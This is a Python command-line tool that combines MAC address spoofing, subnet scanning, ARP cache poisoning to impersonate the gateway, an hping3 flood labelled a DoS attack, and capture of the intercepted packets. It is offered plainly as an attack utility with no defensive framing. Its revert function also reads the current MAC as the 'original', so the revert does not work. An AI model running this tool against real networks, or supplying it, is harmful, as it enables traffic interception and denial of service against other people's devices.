import subprocess
import re
import random
import argparse
from scapy.all import sniff, wrpcap


class Spoofer:
    manufacturers = {
        "samsung": [0x00, 0x16, 0x6c],
        "sony": [0x00, 0x19, 0xc1],
        "dell": [0x00, 0x14, 0x22],
        "konko": [0x00, 0x1a, 0x1e]
    }

    def __init__(self, interface=None, manufacturer=None):
        self.interface = interface
        self.manufacturer = manufacturer if manufacturer else random.choice(list(self.manufacturers.keys()))

    @staticmethod
    def get_interfaces():
        result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
        interfaces = re.findall(r'(\d+): ([\w]+):', result.stdout)
        return [name for num, name in interfaces]

    def generate_mac(self):
        if self.manufacturer not in self.manufacturers:
            raise ValueError(f"Unknown manufacturer: {self.manufacturer}")
        mac = self.manufacturers[self.manufacturer] + [
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff)
        ]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    @staticmethod
    def change_mac(new_mac, interface):
        subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', interface, 'down'])
        subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', interface, 'address', new_mac])
        subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', interface, 'up'])
        print(f"MAC address for {interface} changed to {new_mac}")

    def revert_mac(self, interface):
        original_mac = self.get_original_mac(interface)
        subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', interface, 'down'])
        subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', interface, 'address', original_mac])
        subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', interface, 'up'])
        print(f"MAC address for {interface} reverted to original")

    @staticmethod
    def get_original_mac(interface):
        result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], capture_output=True, text=True)
        return result.stdout.strip()

    @staticmethod
    def scan_subnet():
        print("Scanning subnet for available MAC addresses...")
        result = subprocess.run(['sudo', 'arp-scan', '-l'], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        devices = []
        for line in lines:
            match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})\s+(.+)', line)
            if match:
                ip, mac, _, desc = match.groups()
                devices.append((str(mac), str(ip), str(desc.strip())))
        return devices

    @staticmethod
    def get_gateway():
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        match = re.search(r'default via ([\d.]+)', result.stdout)
        return match.group(1) if match else None

    @staticmethod
    def overwrite_cam(interface, target_mac, router_ip):
        print(f"Overwriting CAM with MAC address {target_mac} for interface {interface}...")
        subprocess.run(['sudo', 'arpspoof', '-i', interface, '-t', router_ip, target_mac])
        print(f"CAM overwritten with MAC address {target_mac} for interface {interface}")

    @staticmethod
    def arp_spoof_gateway(interface, gateway_ip, target_ip):
        print(f"Sending spoofed ARP replies to {target_ip}, making it believe you are the gateway {gateway_ip}...")
        subprocess.run(['sudo', 'arpspoof', '-i', interface, '-t', target_ip, gateway_ip])
        print(f"Sent spoofed ARP replies to {target_ip}.")

    @staticmethod
    def dos_attack(target_ip, interface):
        print(f"Starting DoS attack on {target_ip} from interface {interface}...")
        subprocess.run(['sudo', 'hping3', '--flood', '-I', interface, target_ip])
        print(f"DoS attack on {target_ip} started.")

    @staticmethod
    def capture_packets(interface, output_file):
        print(f"Capturing packets on interface {interface}...")
        packets = sniff(iface=interface, count=100)  # Adjust the count as needed
        wrpcap(output_file, packets)
        print(f"Captured packets saved to {output_file}")


def main():
    parser = argparse.ArgumentParser(description='Spoofer Tool')
    parser.add_argument('-i', '--interface', help='Network interface to spoof (default: all)')
    parser.add_argument('-m', '--manufacturer', choices=Spoofer.manufacturers.keys(),
                        help='Manufacturer for MAC address prefix (default: random)')
    parser.add_argument('--revert', action='store_true', help='Revert to original MAC address')
    parser.add_argument('--scan', action='store_true', help='Scan subnet for available MAC addresses')
    parser.add_argument('--overwrite-cam', action='store_true', help='Overwrite CAM of local router')
    parser.add_argument('--arp-spoof', action='store_true', help='ARP spoof devices to believe you are the gateway')
    parser.add_argument('--dos', action='store_true', help='Perform DoS attack on target')
    parser.add_argument('--capture', action='store_true', help='Capture packets intended for the target')
    parser.add_argument('--router-ip', help='IP address of the router for CAM overwriting')
    parser.add_argument('--target-ip', help='IP address of the target device for ARP spoofing or DoS attack')
    parser.add_argument('--output-file', help='File to save captured packets')

    args = parser.parse_args()

    spoofer = Spoofer(args.interface, args.manufacturer)

    if args.scan:
        devices = spoofer.scan_subnet()
        gateway = spoofer.get_gateway()
        print("Available devices on the network:")
        for mac, ip, desc in devices:
            gw_label = " (Gateway)" if ip == gateway else ""
            print(f"MAC: {mac}, IP: {ip}, Description: {desc}{gw_label}")
        return

    interfaces = [args.interface] if args.interface else spoofer.get_interfaces()

    for interface in interfaces:
        if args.revert:
            spoofer.revert_mac(interface)
        else:
            if args.overwrite_cam:
                target_mac = input("Enter the target MAC address to clone: ")
                if args.router_ip:
                    spoofer.overwrite_cam(interface, target_mac, args.router_ip)
                    if args.dos:
                        spoofer.dos_attack(args.target_ip, interface)
                    if args.capture:
                        spoofer.capture_packets(interface, args.output_file)
                else:
                    print("Router IP address is required for CAM overwriting.")
            elif args.arp_spoof:
                if args.router_ip and args.target_ip:
                    spoofer.arp_spoof_gateway(interface, args.router_ip, args.target_ip)
                else:
                    print("Both router IP and target IP are required for ARP spoofing.")
            else:
                new_mac = spoofer.generate_mac()
                spoofer.change_mac(new_mac, interface)


if __name__ == "__main__":
    main()
